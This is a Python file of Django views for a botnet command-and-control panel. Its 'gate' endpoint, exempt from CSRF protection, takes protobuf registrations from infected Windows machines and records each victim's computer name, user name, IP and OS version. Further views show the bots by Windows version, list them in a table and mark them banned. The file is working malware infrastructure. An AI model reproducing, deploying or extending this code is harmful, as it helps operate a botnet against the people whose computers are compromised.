from django.shortcuts import HttpResponse, render
from django.http import JsonResponse
from django.contrib.auth.models import User
from django.contrib.auth import login
from django.views.decorators.csrf import csrf_exempt
from .bot_pb2 import RegisterBot
from .models import Bot


class Subsidiary:
    def get_bot_ip(self, request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip


class AdminPanel:
    def get_login_page(self, request):
        return render(request, 'main/login.html')

    def get_main_page(self, request):
        counts_is_win7 = Bot.objects.filter(is_win7=True).count()
        counts_is_win10 = Bot.objects.filter(is_win10=True).count()
        counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
        counts_is_win8 = Bot.objects.filter(is_win8=True).count()
        counts_is_win11 = Bot.objects.filter(is_win11=True).count()

        _32x = Bot.objects.filter(is_x64=False).count()
        _64x = Bot.objects.filter(is_x64=True).count()

        print(counts_is_win10)

        if request.user.is_superuser:
            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
                                                                      counts_is_win10, counts_is_win11],
                                                      'x_oc': [_32x, _64x]})

        return HttpResponse('недостачно прав для просмотра ')

    def get_table_page(self, request):
        bots = Bot.objects.all()
        return render(request, 'main/table.html', {'bots': bots})


class Handlers:
    def __init__(self, subsidiary):
        self.sub = subsidiary

    def create(self, request):
        bot = Bot(uid='1', computername='test-pc1', username='user1', is_x64=True, is_server=False, is_win10=True)
        bot.save()
        bot1 = Bot(uid='2', computername='test-pc2', username='user2', is_x64=True, is_server=False, is_win7=True)
        bot1.save()

    def login_handler(self, request):
        username = request.POST['login']
        usr = User.objects.get(username=username)

        if usr.check_password(request.POST['password']):
            login(request, usr)
            return JsonResponse({'verdict': '200'})
        return HttpResponse('')

    @csrf_exempt
    def gate(self, request):
        bot = RegisterBot()
        bot.ParseFromString(request.body)

        ip = self.sub.get_bot_ip(request)

        uid = bot.uid.decode('utf-16-le')
        computername = bot.computername.decode('utf-16-le')
        username = bot.username.decode('utf-16-le')
        os_major = bot.os_major
        os_minor = bot.os_minor
        is_x64 = bot.is_x64
        is_server = bot.is_server

        try:
            _bot = Bot.objects.get(uid=uid)
        except:
            _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)

        if os_major == 10 and os_minor == 0:
            _bot.is_win10 = True
        elif os_major == 6 and os_minor == 1:
            _bot.is_win7 = True
        elif os_major == 5 and os_minor == 1:
            _bot.is_winxp = True

        _bot.save()

        return HttpResponse('200')

    def ban(self, request):
        bot = Bot.objects.get(uid=request.GET['uid'])
        bot.is_banned = True
        bot.save()
        return HttpResponse('200')